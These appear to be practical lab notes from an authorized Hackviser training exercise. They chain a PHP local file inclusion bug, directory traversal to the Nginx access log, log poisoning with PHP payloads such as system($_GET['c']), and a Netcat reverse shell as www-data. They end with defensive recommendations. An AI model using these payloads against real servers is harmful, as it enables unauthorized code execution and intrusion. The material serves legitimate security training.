# Hackviser LFI to Reverse Shell Lab Notes

> **Lab:** Hackviser – LFI / Log Poisoning / Reverse Shell  
> **Document type:** Practical penetration-testing lab notes  
> **Scope:** Authorized training environment only

## 1. Lab Overview

This lab documents a chain of weaknesses and techniques observed in the Hackviser training environment:

1. Identify a Local File Inclusion (LFI) weakness.
2. Use directory traversal to reach the Nginx access log.
3. Place PHP code in an HTTP request that is recorded in the access log.
4. Include the poisoned log through the vulnerable PHP page.
5. Verify command execution under the web-server account.
6. Establish a reverse shell to the source machine.
7. Inspect the web application files and their permissions.

The notes below distinguish **Source** and **Target** instead of using ambiguous labels such as attacker/victim.

## 2. Source and Target Address Reference

| Role | Address observed in the transcript | Description |
|---|---|---|
| **Source** | `10.8.69.24` | Kali Linux machine used to send requests and receive the reverse connection. |
| **Target** | `172.20.4.175` | Hackviser web application server contacted during the main exploitation sequence. |
| **Target / earlier observed address** | `172.20.8.177` | Address shown in an earlier raw HTTP request. The transcript does not establish whether it represents the same interface or an earlier lab state. |
| **Address observed in access-log entries** | `172.20.4.110` | Address recorded in earlier Nginx access-log entries. Its exact role is not conclusively established by the transcript. |

**Important:** These addresses are reproduced from the lab transcript. Do not assume that every address belongs to the same interface or that the network topology is fully known. In the reverse-shell confirmation, the connection explicitly appears as:

```text
connect to [10.8.69.24] from (UNKNOWN) [172.20.4.175] 33184
```

This identifies `10.8.69.24` as the Source listener address and `172.20.4.175` as the Target that initiated the reverse connection. `33184` is the Target's temporary source port for that connection.

## 3. Initial Discovery: Vulnerable PHP Code

The transcript shows the following code in `show-invoice.php`:

```php
<?php
$file = $_GET['invoice'];
include("./invoices//".$file);
?>
```

### What the code does

- `$_GET['invoice']` reads the `invoice` value from the URL query string.
- The value is concatenated with `./invoices//`.
- `include()` asks PHP to include the resulting file.

The application does not show validation or sanitization of the supplied path. This creates an opportunity to manipulate the path and attempt to include a file outside the intended `invoices` directory.

## 4. Directory Traversal and Local File Inclusion

The path used in the transcript was:

```text
../../../../var/log/nginx/access.log
```

The request was sent to the Target:

```bash
curl -s "http://172.20.4.175/show-invoice.php?invoice=../../../../var/log/nginx/access.log"
```

### Concepts

- **Directory Traversal:** Manipulating path components such as `../` to navigate outside an intended directory.
- **Local File Inclusion (LFI):** A vulnerable application includes a file from the local filesystem.
- **Nginx access log:** A server log that commonly records request information such as client address, request line, status code, response size, referrer, and User-Agent.

In this lab, traversal was used to make the vulnerable PHP page include:

```text
/var/log/nginx/access.log
```

The transcript contains both unsuccessful and successful responses during testing, including `504`, `200`, `404`, and `499`. A status code by itself does not prove whether the intended PHP code executed; the returned content and later command output are more meaningful evidence.

## 5. Log Poisoning

The next stage involved sending an HTTP request whose request URI contained PHP code. The intention was for Nginx to record that request in its access log.

An example shown in the transcript was:

```http
GET /<?php passthru('id'); ?> HTTP/1.1
Host: 172.20.8.177
Connection: close
```

A later request used:

```http
GET /<?php system($_GET['c']); ?> HTTP/1.1
Host: 172.20.4.175
Connection: close
```

The Target returned `404 Not Found` for these crafted paths. That response does not, on its own, establish that the log entry was not written. The relevant next check in the lab was to request the access log through the vulnerable inclusion page.

### Why this technique is called Log Poisoning

The request attempts to place attacker-controlled text into a server log. If the application later includes that log as PHP source, and the relevant conditions are met, the PHP interpreter may process the injected PHP tags.

This is a lab-specific explanation of the observed technique, not a recommendation to test systems without authorization.

## 6. Verifying Command Execution

The transcript records this output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This is evidence that the command `id` ran in the context of the web-server account `www-data`.

### What this proves

- The application reached a state where injected PHP was interpreted during log inclusion.
- A system command was executed.
- The command ran as `www-data`, not as `root`.

**Remote Code Execution (RCE)** means that the application allows commands or code to be executed remotely. RCE does not automatically mean that the process has administrative or root privileges.

## 7. Netcat: Source Listener and Target Connection

The successful reverse-shell listener shown in the transcript was started on the Source machine:

```bash
nc -lvnp 4444
```

The listener output was:

```text
listening on [any] 4444 ...
```

The reverse connection then arrived:

```text
connect to [10.8.69.24] from (UNKNOWN) [172.20.4.175] 33184
```

### Understanding the connection

| Item | Meaning |
|---|---|
| Source listener IP | `10.8.69.24` |
| Source listener port | `4444` |
| Target IP | `172.20.4.175` |
| Target temporary source port | `33184` |
| Tool | Netcat (`nc`) |

### Netcat option breakdown

| Option | Meaning |
|---|---|
| `-l` | Listen for an incoming connection. |
| `-v` | Verbose output. |
| `-n` | Do not resolve hostnames or service names. |
| `-p` | Specify the local port, where supported by the installed Netcat variant. |
| `4444` | The selected listener port in this lab. |

The transcript also shows tests with ports `6666`, `1337`, `5555`, and `4444`. One attempt displayed `listening on [any] 39033` after using `nc -lvn 5555`. This illustrates why the installed Netcat implementation and its help page should be checked rather than assuming every variant handles options identically.

## 8. Reverse Shell Result

The successful connection displayed:

```text
bash: cannot set terminal process group (426): Inappropriate ioctl for device
bash: no job control in this shell
www-data@debian:~/html$
```

This indicates that a shell was obtained, but it was not attached to a fully interactive terminal (TTY). The messages about the terminal process group and job control are common limitations of a basic reverse shell.

### Reverse Shell vs. Bind Shell

| Type | Which side listens? | Which side initiates the connection? |
|---|---|---|
| **Reverse Shell** | Source | Target |
| **Bind Shell** | Target | Source |

In this lab, the Source listened on port `4444`, and the Target initiated the connection back to it. Therefore, the observed result is a Reverse Shell.

## 9. Netcat as a Basic TCP Client

The transcript also shows Netcat being used to connect to the Target's HTTP service:

```bash
nc 172.20.4.175 80
```

A manual HTTP request was then entered:

```http
GET / HTTP/1.1
Host: 172.20.4.175
Connection: close

```

The empty line after the headers is important because it marks the end of the HTTP request headers.

This demonstrates that Netcat can be used both as a listener and as a basic TCP client.

## 10. Post-Exploitation File Inspection

After the reverse shell was established, the transcript shows directory inspection from:

```text
www-data@debian:~/html$
```

The listed web application files included:

```text
css
fonts
index.php
invoice.php
invoices
js
show-invoice.php
style.css
```

The vulnerable PHP file was read again:

```bash
cat show-invoice.php
```

The transcript also shows a file metadata check:

```bash
stat show-invoice.php
```

Relevant output:

```text
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
```

### Interpreting `0644`

| Permission | Meaning |
|---|---|
| Owner: `6` (`rw-`) | The owner can read and write. |
| Group: `4` (`r--`) | Group members can read. |
| Others: `4` (`r--`) | Other users can read. |

The file is owned by `root`, but its `0644` permissions allow other users, including the web-server account if applicable, to read it. This does **not** mean that `www-data` owns the file, can modify it, or has become root.

## 11. Understanding the HTTP Status Codes in the Transcript

| Status | General meaning | Contextual note |
|---|---|---|
| `200 OK` | The request succeeded. | Seen when the vulnerable page returned content, including access-log content. |
| `404 Not Found` | The requested resource was not found. | Returned for several crafted request paths. It does not alone determine whether a request was logged. |
| `499` | Nginx-specific status commonly used when the client closes the connection before the server sends a response. | Appeared during an access-log inclusion request. |
| `504 Gateway Timeout` | A gateway or proxy did not receive a timely response from an upstream server. | Appeared during an earlier inclusion attempt. |

Interpret status codes together with the request, response body, and other evidence. Do not treat one status code as definitive proof of exploitation success or failure.

## 12. Key Security Concepts Learned

| Concept | What the lab demonstrated |
|---|---|
| Directory Traversal | Manipulating a file path with `../` components. |
| LFI | Including a local file through a vulnerable PHP parameter. |
| Log Poisoning | Attempting to place PHP code in a server log and include that log. |
| RCE | Executing a system command through the vulnerable application. |
| Reverse Shell | A shell connection initiated from the Target back to a listener on the Source. |
| Netcat | A utility for listening on TCP ports and making TCP connections. |
| Linux permissions | Reading ownership and access mode information with `ls -al` and `stat`. |
| Least privilege | The observed command execution ran as `www-data`, not root. |

## 13. Important Distinctions

- **Directory Traversal is not the same as LFI.** Traversal manipulates a path; LFI occurs when the application includes a local file.
- **RCE is not the same as a Reverse Shell.** RCE is the ability to execute code or commands; a reverse shell is one possible interactive communication method.
- **A Reverse Shell is not Privilege Escalation.** The shell in this transcript ran as `www-data`.
- **File ownership is not the same as file permissions.** A file owned by root can still be readable by other users.
- **An HTTP error response does not necessarily prove that no log entry was written.** Confirm by examining the relevant evidence.

## 14. Lab Conclusion

The transcript documents a successful progression from a PHP file-inclusion weakness to command execution and a reverse-shell connection. The strongest evidence is the `id` output showing `www-data`, followed by the Netcat connection from the Target address `172.20.4.175` to the Source listener at `10.8.69.24:4444`.

The resulting shell provided access as the web-server account. The transcript does not demonstrate root access or a completed privilege-escalation step.

## 15. Defensive Recommendations

The following are general defensive lessons derived from the weakness demonstrated in this lab:

1. Avoid passing untrusted user input directly to PHP `include()` or filesystem functions.
2. Use strict allowlists for selectable invoice identifiers rather than accepting arbitrary paths.
3. Canonicalize and validate file paths, and ensure resolved paths remain inside the intended directory.
4. Keep application files and logs separate; do not make logs available to application include paths.
5. Configure PHP and the web server with least privilege.
6. Restrict write permissions on application code and sensitive log files.
7. Monitor unusual requests containing traversal sequences, PHP tags, or suspicious command parameters.
8. Review web-server and application logs for unexpected file-inclusion behavior and outbound connections.

## 16. Scope and Attribution

These notes are based on the supplied Hackviser lab transcript. The IP addresses, commands, outputs, and file names are retained where relevant. Where the transcript does not establish the meaning of an address or the cause of a response, that uncertainty is explicitly stated.

All techniques should be practiced only in Hackviser or another environment for which explicit authorization has been granted.
